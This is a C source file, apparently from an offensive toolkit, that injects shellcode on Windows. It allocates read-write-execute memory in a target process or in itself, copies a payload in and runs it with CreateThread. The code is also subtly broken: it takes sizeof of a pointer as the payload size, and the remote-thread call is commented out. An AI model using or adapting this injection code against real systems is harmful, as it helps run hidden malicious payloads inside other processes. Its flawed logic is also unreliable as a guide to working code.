#include "create_thread_inject.h"

BOOL create_remote_thread_inject(_In_ HANDLE h_target_proc, _In_ const unsigned char* shellcode) {
	size_t shellcode_size = sizeof(shellcode);
	PVOID addr = VirtualAllocEx(h_target_proc, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!addr) {
		PRINT_API_ERR("VirtualAllocEX");
		return FALSE;
	}

	if (!WriteProcessMemory(h_target_proc, addr, shellcode, shellcode_size, NULL)) {
		PRINT_API_ERR("WriteProcessMemory");
		return FALSE;
	}

	/*CreateRemoteThread(h_target_proc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);*/

	return TRUE;
}

BOOL create_thread_self_inject(_In_ const unsigned char shellcode[]) {
	PVOID addr = VirtualAlloc(NULL, payloadx64_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!addr) {
		PRINT_API_ERR("VirtualAllocEX");
		return FALSE;
	}

	CopyMemory(addr, shellcode, payloadx64_size);
	
	if (!CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL)) {
		PRINT_API_ERR("CreateThread");
		return FALSE;
	}

	return TRUE;
}
